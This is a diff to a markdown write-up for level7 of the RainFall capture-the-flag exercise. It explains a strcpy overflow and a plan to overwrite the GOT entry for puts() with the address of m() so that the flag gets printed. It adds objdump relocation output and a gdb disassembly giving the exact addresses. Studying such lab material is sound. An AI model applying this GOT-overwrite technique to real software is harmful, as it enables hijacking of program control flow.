@@ -115,7 +115,6 @@ End of assembler dump.
 
 ```
 
-
 Ghidra : 
 
 ```c
@@ -180,20 +179,60 @@ level7@RainFall:~$
 
 ```
 
-The binary segfault when it doesn't have at least 2 argument we see.
+The binary segfault when it doesn't have at least 2 argument.
 
-It is using strcpy on argv[1] and argv[2], since its param + 4 and param + 8
+It is using strcpy on av[1] and av[2].
 
-After a long analysis, the binary open the flag file, and read it using fgets and store it in the variable 'c'.
+The binary open the flag file, and read it using fgets and store it in the variable 'c'.
 
-It might a global variable, and its actually readen in the 'm' function, so we have to call it, lets try doing that firstly.
+The c variable might be a global, and its actually readen in the 'm' function.
 
+The goal here is to call the m() function after the fgets() in order to get our password.
 
-The offset should be not that high to overwrite an andress, since all it does is strcpy on argv1 and 2.
+We are going to overwrite puts() function with the m() function, using the same method as the previous one.
 
-We are going to overwrite puts() function with the m() function.
+```sh
+level7@RainFall:~$ objdump -R ./level7 
 
+./level7:     file format elf32-i386
 
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049904 R_386_GLOB_DAT    __gmon_start__
+08049914 R_386_JUMP_SLOT   printf
+08049918 R_386_JUMP_SLOT   fgets
+0804991c R_386_JUMP_SLOT   time
+08049920 R_386_JUMP_SLOT   strcpy
+08049924 R_386_JUMP_SLOT   malloc
+08049928 R_386_JUMP_SLOT   puts
+0804992c R_386_JUMP_SLOT   __gmon_start__
+08049930 R_386_JUMP_SLOT   __libc_start_main
+08049934 R_386_JUMP_SLOT   fopen
+
+```
+
+We have the puts address, and we are going to take the m() address.
+
+```sh
+(gdb) disas m
+Dump of assembler code for function m:
+   >>> 0x080484f4 <+0>:	push   %ebp <<<<<<<<<<<<<<<<<<<< HERE
+   0x080484f5 <+1>:	mov    %esp,%ebp
+   0x080484f7 <+3>:	sub    $0x18,%esp
+   0x080484fa <+6>:	movl   $0x0,(%esp)
+   0x08048501 <+13>:	call   0x80483d0 <time@plt>
+   0x08048506 <+18>:	mov    $0x80486e0,%edx
+   0x0804850b <+23>:	mov    %eax,0x8(%esp)
+   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
+   0x08048517 <+35>:	mov    %edx,(%esp)
+   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
+   0x0804851f <+43>:	leave  
+   0x08048520 <+44>:	ret    
+End of assembler dump.
+(gdb) 
+```
+
+We will print A to get the offset to EIP, teleport to the puts return address and overwrite it with the m() one.
 
 
 ```sh
@@ -203,4 +242,4 @@ We are going to overwrite puts() function with the m() function.
 
 ```
 
-And we get our flag
+Its basically the same script but this time we overwrite a function call.
